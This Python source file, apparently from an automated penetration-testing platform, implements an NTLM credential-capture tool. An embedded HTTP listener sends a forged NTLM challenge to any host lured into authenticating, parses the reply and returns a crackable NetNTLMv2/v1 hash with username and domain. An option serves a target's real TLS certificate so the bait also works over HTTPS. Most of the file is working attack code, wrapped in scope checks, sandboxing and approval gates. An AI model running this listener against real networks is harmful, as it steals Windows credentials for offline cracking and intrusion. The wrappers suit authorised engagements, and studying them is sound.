"""Durable ``nexus.post.ntlm_capture`` handler: governed NetNTLM challenge catcher.

A whole class of Windows engagements needs a *credential interception* primitive:
make a host authenticate to us over HTTP (a chat client rendering an ``<img>``,
an Office document opening a template, an SMB shortcut in a browsed share) and
record the NetNTLM challenge/response so it can be cracked offline or relayed.
Until now the catalogue had no governed way to do that: the operator had to leave
OMNI and run ``responder``/``ntlmrelayx`` by hand, which breaks the
scope/policy/audit chain the same way ``nc -lvnp`` did before
``nexus.post.listener`` existed.

Design notes
------------
* It is an **NTLM *capture***, not a relay and not a credential oracle: it never
  validates the response it receives, so it cannot be used to brute-force or to
  prove a password. It only records what the target chose to send.
* Execution stays inside the sandbox contract: a stdlib ``socket`` server is run
  through ``sandbox_for_environment`` (``python3`` is already allowlisted); the
  handler never spawns a process itself.
* It is engagement-scoped (``scope_target_field=None``): the peer is only known
  after the connection arrives, so the handler validates the connecting host
  against the signed scope itself and refuses to return anything captured from an
  out-of-scope host. "Nobody connected" is reported separately
  (``ntlm_capture_no_connection``) so a run with no inbound traffic is never
  mistaken for a refused peer (only the latter is a governance event).
* ``risk=HIGH`` + ``effect=post_exploitation``: it makes a remote host perform an
  authentication against the operator's listener, so the gateway forces human
  approval unless the operator opted into trust mode.
* The challenge/response is persisted to the workspace with its sha256 so the
  report can carry it with chain of custody, and the crackable hash string is
  returned in the observation. No cracker is invoked: the engine has no
  wordlist/hash-cracking tool yet (tracked as a gap, see BACKLOG).
"""

from __future__ import annotations

import hashlib
import json
import os
import secrets
import ssl
from pathlib import Path
from typing import Any

from nexus_core.kernel.models import RiskLevel, RunContext, ToolDefinition, ToolResult
from nexus_core.kernel.sandbox import sandbox_for_environment
from nexus_core.kernel.sessions import validate_session_scope
from nexus_core.kernel.scope_loader import scope_signing_secret
from nexus_core.scope import ScopeValidator, ScopeViolation

from ._exec import RECON_ALLOWED_PROGRAMS, run_in_sandbox, safe_run_id

NTLM_CAPTURE_ALLOWED_PROGRAMS = RECON_ALLOWED_PROGRAMS

NTLM_CAPTURE_DEFAULT_BIND = "0.0.0.0"
NTLM_CAPTURE_DEFAULT_TIMEOUT_SECONDS = 120
NTLM_CAPTURE_MAX_TIMEOUT_SECONDS = 1800
NTLM_CAPTURE_DEFAULT_IDLE_SECONDS = 5
NTLM_CAPTURE_MAX_IDLE_SECONDS = 60
NTLM_CAPTURE_DEFAULT_MAX_CONNECTIONS = 5
NTLM_CAPTURE_MAX_CONNECTIONS = 50
NTLM_CAPTURE_DEFAULT_MAX_BYTES = 262_144
NTLM_CAPTURE_MAX_BYTES = 2_000_000
NTLM_CAPTURE_MAX_TARGET_NAME_CHARS = 64

#: stdlib HTTP NTLM catcher executed inside the sandbox. argv layout (after
#: ``-c``): bind_host port timeout idle max_connections max_bytes challenge_hex
#: target_name tls_cert_path tls_key_path (the last two are empty without TLS).
NTLM_CAPTURE_CLIENT_SCRIPT = r"""
import binascii, hashlib, json, socket, ssl, struct, sys, time

SIG = b"NTLMSSP\x00"

FLAGS = (
    0x00000001  # NEGOTIATE_UNICODE
    | 0x00000004  # REQUEST_TARGET
    | 0x00000200  # NEGOTIATE_NTLM
    | 0x00008000  # NEGOTIATE_ALWAYS_SIGN
    | 0x00080000  # NEGOTIATE_EXTENDED_SESSIONSECURITY
    | 0x00800000  # NEGOTIATE_TARGET_INFO
    | 0x00010000  # NEGOTIATE_TARGET_TYPE_DOMAIN
    | 0x02000000  # NEGOTIATE_VERSION
    | 0x20000000  # NEGOTIATE_128
    | 0x80000000  # NEGOTIATE_56
)


def emit(payload):
    print(json.dumps(payload))
    sys.stdout.flush()


def main():
    (bind_host, port, timeout, idle, max_conns, max_bytes, challenge_hex, target_name,
     tls_cert, tls_key) = sys.argv[1:11]
    timeout = float(timeout)
    idle = float(idle)
    max_conns = int(max_conns)
    max_bytes = int(max_bytes)
    challenge = binascii.unhexlify(challenge_hex)
    if len(challenge) != 8:
        raise SystemExit("challenge must be 8 bytes")

    # --- NTLMSSP type 2 (CHALLENGE) ---------------------------------------
    dns_host = target_name.lower() + ".local" if target_name else ""
    nb_name = target_name.upper().encode("utf-16-le") if target_name else b""
    dns_name = dns_host.encode("utf-16-le") if dns_host else b""
    av_pairs = []
    if nb_name:
        av_pairs.append(struct.pack("<HH", 2, len(nb_name)) + nb_name)      # MsvAvNbDomainName
        av_pairs.append(struct.pack("<HH", 1, len(nb_name)) + nb_name)      # MsvAvNbComputerName
        av_pairs.append(struct.pack("<HH", 4, len(dns_name)) + dns_name)    # MsvAvDnsDomainName
        av_pairs.append(struct.pack("<HH", 3, len(dns_name)) + dns_name)    # MsvAvDnsComputerName
    av_pairs.append(struct.pack("<HH", 7, 8) + int(time.time() * 10000000).to_bytes(8, "little", signed=False))
    av_pairs.append(struct.pack("<HH", 0, 0))                               # MsvAvEOL
    av_blob = b"".join(av_pairs)
    type2 = (
        SIG
        + struct.pack("<I", 2)
        + struct.pack("<HHI", len(nb_name), len(nb_name), 48)
        + struct.pack("<I", FLAGS)
        + challenge
        + b"\x00" * 8
        + struct.pack("<HHI", len(av_blob), len(av_blob), 48 + len(nb_name))
        + nb_name
        + av_blob
    )
    type2_b64 = binascii.b2a_base64(type2).decode().strip()

    def parse_type3(raw):
        if raw[:8] != SIG or struct.unpack_from("<I", raw, 8)[0] != 3:
            return None

        def field(offset):
            length, _max, off = struct.unpack_from("<HHI", raw, offset)
            return raw[off:off + length]

        lm = field(12)
        nt = field(20)
        domain = field(28).decode("utf-16-le", "replace")
        user = field(36).decode("utf-16-le", "replace")
        return {"user": user, "domain": domain, "nt": nt, "lm": lm}

    def hash_string(parsed):
        nt = parsed["nt"]
        if len(nt) > 24:  # NTLMv2: NTProofStr (16) + blob
            proof, blob = nt[:16], nt[16:]
            return "netntlmv2", "%s::%s:%s:%s:%s" % (
                parsed["user"], parsed["domain"], challenge_hex, proof.hex(), blob.hex(),
            )
        return "netntlmv1", "%s::%s:%s:%s" % (
            parsed["user"], parsed["domain"], parsed["lm"].hex(), nt.hex(),
        )

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    started = time.time()
    try:
        server.bind((bind_host, int(port)))
        server.listen(5)
        server.settimeout(timeout)
    except OSError as exc:
        emit({"ok": False, "bound": False, "port": int(port),
              "error": "%s: %s" % (type(exc).__name__, exc)})
        return

    # TLS is opt-in: a poisoned name that a victim reaches over https needs the
    # certificate the victim expects (e.g. the one leaked by the server itself),
    # otherwise the client aborts the handshake and never offers NTLM.
    tls_context = None
    if tls_cert and tls_key:
        try:
            tls_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            tls_context.load_cert_chain(tls_cert, tls_key)
        except (OSError, ssl.SSLError) as exc:
            emit({"ok": False, "bound": True, "port": int(port),
                  "error": "tls setup failed: %s: %s" % (type(exc).__name__, exc)})
            return

    requests = []
    peers = []
    captured = None
    bytes_seen = 0
    connections = 0
    status = "ok"
    deadline = started + timeout

    def read_request(conn):
        # Read one HTTP request head (up to CRLFCRLF); return text or ''.
        nonlocal bytes_seen
        chunks = []
        conn.settimeout(idle)
        while bytes_seen < max_bytes:
            try:
                data = conn.recv(4096)
            except socket.timeout:
                break
            except OSError:
                break
            if not data:
                break
            bytes_seen += len(data)
            chunks.append(data)
            if b"\r\n\r\n" in b"".join(chunks):
                break
        return b"".join(chunks).decode("utf-8", "replace")

    def send(conn, payload):
        try:
            conn.sendall(payload)
        except OSError:
            pass

    def unauthorized(challenge_value):
        header = "NTLM" if challenge_value is None else "NTLM " + challenge_value
        return (
            "HTTP/1.1 401 Unauthorized\r\n"
            "WWW-Authenticate: " + header + "\r\n"
            "Content-Type: text/html\r\n"
            "Content-Length: 0\r\n"
            "Connection: keep-alive\r\n\r\n"
        ).encode()

    try:
        while time.time() < deadline and connections < max_conns and captured is None:
            try:
                conn, peer = server.accept()
            except socket.timeout:
                break
            connections += 1
            peer_host = peer[0] if isinstance(peer, tuple) else str(peer)
            if peer_host not in peers:
                peers.append(peer_host)
            if tls_context is not None:
                try:
                    conn.settimeout(idle)
                    conn = tls_context.wrap_socket(conn, server_side=True)
                except (OSError, ssl.SSLError):
                    # A plain-HTTP probe (or a client that rejects the cert) must
                    # not abort the whole capture window.
                    try:
                        conn.close()
                    except OSError:
                        pass
                    continue
            with conn:
                challenged = False
                for _ in range(4):
                    request = read_request(conn)
                    if not request:
                        break
                    requests.append(request)
                    token = None
                    for line in request.splitlines():
                        if line.lower().startswith("authorization:") and "NTLM" in line.upper():
                            token = line.split(None, 2)[-1].strip()
                    if token is None:
                        send(conn, unauthorized(None))
                        continue
                    try:
                        raw = binascii.a2b_base64(token)
                    except Exception:
                        send(conn, unauthorized(None))
                        continue
                    message_type = struct.unpack_from("<I", raw, 8)[0] if len(raw) >= 12 else 0
                    if message_type == 3:
                        captured = parse_type3(raw)
                        send(conn, b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
                        break
                    # Type 1 (NEGOTIATE): answer with our challenge.
                    challenged = True
                    send(conn, unauthorized(type2_b64))
                # ``status`` is a monotonic outcome of the *whole* capture, not of
                # the last connection: a bare probe that arrives before the NTLM
                # handshake must not relabel a run that did capture a hash.
                if captured is not None:
                    status = "captured"
                elif challenged and status != "captured":
                    status = "challenged"
    except OSError as exc:
        status = "err:%s" % type(exc).__name__
    finally:
        server.close()

    raw_requests = "\n\n".join(requests)
    payload = {
        "ok": True,
        "bound": True,
        "port": int(port),
        "peer": peers[0] if peers else "",
        "peers": peers,
        "connections": connections,
        "requests": len(requests),
        "status": status,
        "tls": tls_context is not None,
        "challenge": challenge_hex,
        "bytes": bytes_seen,
        "sha256": hashlib.sha256(raw_requests.encode("utf-8", "replace")).hexdigest(),
        "transcript": raw_requests[:200000],
        "elapsed_ms": int((time.time() - started) * 1000),
    }
    if captured:
        kind, value = hash_string(captured)
        payload.update({
            "captured": True,
            "hash_type": kind,
            "hash": value,
            "username": captured["user"],
            "domain": captured["domain"],
        })
    else:
        payload.update({"captured": False})
    emit(payload)


main()
"""


def ntlm_capture_definition(tenant_id: str = "system") -> ToolDefinition:
    """Return the durable ToolDefinition for ``nexus.post.ntlm_capture``."""
    return ToolDefinition(
        tool_id="nexus.post.ntlm_capture",
        name="NetNTLM capture listener",
        tenant_id=tenant_id,
        description=(
            "Escucha UNA conexión entrante, responde un reto NTLM por HTTP y "
            "registra la respuesta NetNTLM (hash crackeable) que el host "
            "objetivo envía al renderizar un recurso del operador. No valida la "
            "credencial ni la relaya: solo la captura. Ejecútala en segundo "
            "plano y dispara la autenticación con otra tool. HIGH: requiere "
            "aprobación salvo trust mode."
        ),
        input_schema={
            "type": "object",
            "properties": {
                "port": {"type": "integer", "minimum": 1, "maximum": 65535},
                "bind_host": {"type": "string", "minLength": 1, "maxLength": 255},
                "target_name": {
                    "type": "string",
                    "maxLength": NTLM_CAPTURE_MAX_TARGET_NAME_CHARS,
                },
                "timeout_seconds": {
                    "type": "integer",
                    "minimum": 5,
                    "maximum": NTLM_CAPTURE_MAX_TIMEOUT_SECONDS,
                },
                "idle_seconds": {
                    "type": "integer",
                    "minimum": 1,
                    "maximum": NTLM_CAPTURE_MAX_IDLE_SECONDS,
                },
                "max_connections": {
                    "type": "integer",
                    "minimum": 1,
                    "maximum": NTLM_CAPTURE_MAX_CONNECTIONS,
                },
                "max_output_bytes": {
                    "type": "integer",
                    "minimum": 1024,
                    "maximum": NTLM_CAPTURE_MAX_BYTES,
                },
                "tls_cert": {
                    "type": "string",
                    "minLength": 1,
                    "maxLength": 4096,
                    "description": (
                        "Ruta RELATIVA al workspace del certificado PEM con el que "
                        "servir TLS (p. ej. el certificado real del objetivo obtenido "
                        "de la sala). Con tls_key, el cebo también funciona en https."
                    ),
                },
                "tls_key": {
                    "type": "string",
                    "minLength": 1,
                    "maxLength": 4096,
                    "description": "Ruta RELATIVA al workspace de la clave PEM sin contraseña.",
                },
            },
            "required": ["port"],
            "additionalProperties": False,
        },
        risk=RiskLevel.HIGH,
        effect="post_exploitation",
        required_permissions=["execute:tool:nexus.post.ntlm_capture"],
        timeout_seconds=NTLM_CAPTURE_MAX_TIMEOUT_SECONDS + 120,
        max_output_bytes=NTLM_CAPTURE_MAX_BYTES + 1_000_000,
        scope_target_field=None,
        scope_required=True,
    )


def _bounded(value: Any, *, default: int, minimum: int, maximum: int) -> int:
    requested = value
    if requested in (None, ""):
        return default
    return min(maximum, max(minimum, int(requested)))


def _resolve_workspace_file(value: Any, root: str, field: str) -> str:
    """Resolve a workspace-relative input file, refusing anything outside it."""
    text = str(value or "").strip()
    if not text:
        raise ValueError(f"{field} is required")
    candidate = Path(text)
    candidate = candidate if candidate.is_absolute() else Path(root) / candidate
    resolved = candidate.resolve()
    if resolved != Path(root).resolve() and Path(root).resolve() not in resolved.parents:
        raise ValueError(f"{field} must stay inside the workspace")
    if not resolved.is_file():
        raise ValueError(f"{field} does not exist: {text}")
    try:
        with open(resolved, "rb") as handle:
            handle.read(1)
    except OSError as exc:
        raise ValueError(f"{field} is not readable: {exc}") from None
    return str(resolved)


def _load_tls_pair(cert_path: str, key_path: str) -> None:
    """Fail closed before the sandbox runs when the cert/key pair is unusable.

    A capture that silently never negotiates TLS looks exactly like "nobody took
    the bait", which is the kind of ambiguity this engine refuses to ship.
    """
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    try:
        context.load_cert_chain(cert_path, key_path)
    except (OSError, ssl.SSLError) as exc:
        raise ValueError(f"tls_cert/tls_key do not load as a pair: {exc}") from None


def _parse_last_json(stdout: str) -> dict[str, Any]:
    """Return the last JSON object printed by the catcher, else raise ``ValueError``."""
    for line in reversed(stdout.splitlines()):
        line = line.strip()
        if not line or not line.startswith("{"):
            continue
        try:
            payload = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(payload, dict):
            return payload
    raise ValueError("ntlm capture client did not return a JSON result")


def _peer_in_scope(context: RunContext, peer: str) -> bool:
    """True when ``peer`` is covered by the signed engagement scope."""
    try:
        ScopeValidator(context.scope, signing_secret=scope_signing_secret()).validate(peer)
        return True
    except ScopeViolation:
        return False


async def ntlm_capture_handler(arguments: dict, context: RunContext) -> ToolResult:
    """Bind, catch one host's NTLM response and return the crackable hash."""
    try:
        validate_session_scope(context)
    except PermissionError:
        return ToolResult(verification_method="ntlm_capture_scope_required")

    port = int(arguments.get("port") or 0)
    if not 1 <= port <= 65535:
        raise ValueError("port out of range")
    bind_host = str(arguments.get("bind_host") or NTLM_CAPTURE_DEFAULT_BIND).strip()
    if not bind_host or any(ord(ch) < 0x20 for ch in bind_host):
        raise ValueError("bind_host is invalid")
    target_name = str(arguments.get("target_name") or "WORKGROUP").strip()
    if any(ord(ch) < 0x20 for ch in target_name):
        raise ValueError("target_name contains control characters")

    timeout_seconds = _bounded(
        arguments.get("timeout_seconds"),
        default=NTLM_CAPTURE_DEFAULT_TIMEOUT_SECONDS,
        minimum=5,
        maximum=NTLM_CAPTURE_MAX_TIMEOUT_SECONDS,
    )
    idle_seconds = _bounded(
        arguments.get("idle_seconds"),
        default=NTLM_CAPTURE_DEFAULT_IDLE_SECONDS,
        minimum=1,
        maximum=NTLM_CAPTURE_MAX_IDLE_SECONDS,
    )
    max_connections = _bounded(
        arguments.get("max_connections"),
        default=NTLM_CAPTURE_DEFAULT_MAX_CONNECTIONS,
        minimum=1,
        maximum=NTLM_CAPTURE_MAX_CONNECTIONS,
    )
    max_bytes = _bounded(
        arguments.get("max_output_bytes"),
        default=NTLM_CAPTURE_DEFAULT_MAX_BYTES,
        minimum=1024,
        maximum=NTLM_CAPTURE_MAX_BYTES,
    )
    challenge = secrets.token_hex(8)

    workspace_root = os.getenv("NEXUS_WORKSPACE_ROOT", os.getcwd())
    tls_cert = str(arguments.get("tls_cert") or "").strip()
    tls_key = str(arguments.get("tls_key") or "").strip()
    if bool(tls_cert) != bool(tls_key):
        raise ValueError("tls_cert and tls_key must be provided together")
    tls_cert_path = ""
    tls_key_path = ""
    tls_cert_sha256 = ""
    if tls_cert and tls_key:
        tls_cert_path = _resolve_workspace_file(tls_cert, workspace_root, "tls_cert")
        tls_key_path = _resolve_workspace_file(tls_key, workspace_root, "tls_key")
        _load_tls_pair(tls_cert_path, tls_key_path)
        with open(tls_cert_path, "rb") as handle:
            tls_cert_sha256 = hashlib.sha256(handle.read()).hexdigest()

    argv = [
        "python3",
        "-c",
        NTLM_CAPTURE_CLIENT_SCRIPT,
        bind_host,
        str(port),
        str(timeout_seconds),
        str(idle_seconds),
        str(max_connections),
        str(max_bytes),
        challenge,
        target_name,
        tls_cert_path,
        tls_key_path,
    ]
    sandbox = sandbox_for_environment(
        workspace_root, allowed_programs=NTLM_CAPTURE_ALLOWED_PROGRAMS
    )
    result = await run_in_sandbox(
        sandbox,
        argv,
        timeout_seconds=timeout_seconds + idle_seconds + 30,
        image_env="NEXUS_NTLM_CAPTURE_IMAGE",
        default_image="python:3.12-alpine",
    )

    evidence: dict[str, Any] = {
        "port": port,
        "bind_host": bind_host,
        "target_name": target_name,
        "timeout_seconds": timeout_seconds,
        "max_connections": max_connections,
        "noise_level": "high",
        "tls": bool(tls_cert_path),
        "tls_cert": os.path.basename(tls_cert_path) or None,
        "tls_cert_sha256": tls_cert_sha256 or None,
    }
    if result.timed_out:
        return ToolResult(
            output={"error": "ntlm capture timed out", "port": port},
            verified=False,
            verification_method="ntlm_capture_timeout",
            evidence=evidence,
            exit_code=result.exit_code,
            accepted_exit_codes=(0,),
            stdout=result.stdout,
            stderr=result.stderr,
            timed_out=True,
        )

    try:
        payload = _parse_last_json(result.stdout)
    except ValueError as exc:
        return ToolResult(
            output={"error": str(exc), "port": port},
            verified=False,
            verification_method="ntlm_capture_parse_failed",
            evidence=evidence,
            exit_code=result.exit_code,
            accepted_exit_codes=(0,),
            stdout=result.stdout,
            stderr=result.stderr,
        )

    if not payload.get("ok"):
        method = (
            "ntlm_capture_no_connection" if payload.get("bound") else "ntlm_capture_bind_failed"
        )
        evidence["error"] = payload.get("error")
        return ToolResult(
            output={"error": payload.get("error"), "port": port},
            verified=False,
            verification_method=method,
            evidence=evidence,
            exit_code=result.exit_code,
            accepted_exit_codes=(0,),
            stdout=result.stdout,
            stderr=result.stderr,
        )

    peer = str(payload.get("peer") or "")
    if not peer:
        # The listener bound and the window elapsed with nobody connecting. That
        # is "the bait was not taken", not a denial, and it must never be
        # reported as an out-of-scope authentication attempt: the two used to
        # share one method name and one message, so a run where no host ever
        # appeared was indistinguishable from one that refused a real peer.
        evidence.update({
            "connections": payload.get("connections"),
            "requests": payload.get("requests"),
            "status": payload.get("status"),
        })
        return ToolResult(
            output={
                "error": "no inbound connection during the capture window",
                "port": port,
                "connections": payload.get("connections"),
                "status": payload.get("status"),
            },
            verified=False,
            verification_method="ntlm_capture_no_connection",
            # The listener bound and the window elapsed with nobody connecting:
            # a determinate observation about the target segment (V0-22).
            outcome="negative",
            evidence=evidence,
            exit_code=result.exit_code,
            accepted_exit_codes=(0,),
            stdout=result.stdout,
            stderr=result.stderr,
        )

    # The peer is only known now: fail closed when the connecting host is not in
    # the signed scope, so a catch can never become an out-of-scope interaction.
    if not _peer_in_scope(context, peer):
        evidence["peer"] = peer
        return ToolResult(
            output={
                "error": "inbound connection from out-of-scope host",
                "peer": peer,
                "port": port,
            },
            verified=False,
            verification_method="ntlm_capture_peer_out_of_scope",
            evidence=evidence,
            exit_code=result.exit_code,
            accepted_exit_codes=(0,),
            stdout=result.stdout,
            stderr=result.stderr,
        )

    transcript = str(payload.get("transcript") or "")
    # Persist the exchange (and the hash when one was captured) as workspace
    # artifacts so they can be read back with nexus.workspace.read and carry a
    # sha256 into the report.
    artifact = ""
    hash_artifact = ""
    try:
        artifact = os.path.join(
            workspace_root, f"ntlm_capture_{safe_run_id(context)}_{port}.txt"
        )
        with open(artifact, "w", encoding="utf-8") as handle:
            handle.write(transcript)
    except OSError:
        artifact = ""

    captured = bool(payload.get("captured"))
    if captured:
        try:
            hash_artifact = os.path.join(
                workspace_root, f"ntlm_capture_{safe_run_id(context)}_{port}.hash"
            )
            with open(hash_artifact, "w", encoding="utf-8") as handle:
                handle.write(str(payload.get("hash") or "") + "\n")
        except OSError:
            hash_artifact = ""

    evidence.update(
        {
            "peer": peer,
            "peers": payload.get("peers") or [],
            "connections": payload.get("connections"),
            "requests": payload.get("requests"),
            "bytes": payload.get("bytes"),
            "sha256": payload.get("sha256"),
            "challenge": payload.get("challenge"),
            "status": payload.get("status"),
            "tls": bool(payload.get("tls")),
            "hash_type": payload.get("hash_type"),
            "artifact": artifact or None,
            "hash_artifact": hash_artifact or None,
        }
    )
    return ToolResult(
        output={
            "peer": peer,
            "port": port,
            "connections": payload.get("connections"),
            "requests": payload.get("requests"),
            "status": payload.get("status"),
            "tls": bool(payload.get("tls")),
            "captured": captured,
            "hash_type": payload.get("hash_type"),
            "username": payload.get("username"),
            "domain": payload.get("domain"),
            "hash": payload.get("hash"),
            "transcript": transcript,
        },
        verified=captured,
        verification_method="ntlm_capture_hash" if captured else "ntlm_capture_no_hash",
        # The peer connected and the exchange finished without a recoverable
        # hash: a negative answer, distinct from the refusal above (V0-22).
        outcome="" if captured else "negative",
        evidence=evidence,
        exit_code=result.exit_code,
        accepted_exit_codes=(0,),
        stdout=result.stdout,
        stderr=result.stderr,
    )


__all__ = [
    "NTLM_CAPTURE_CLIENT_SCRIPT",
    "ntlm_capture_definition",
    "ntlm_capture_handler",
]
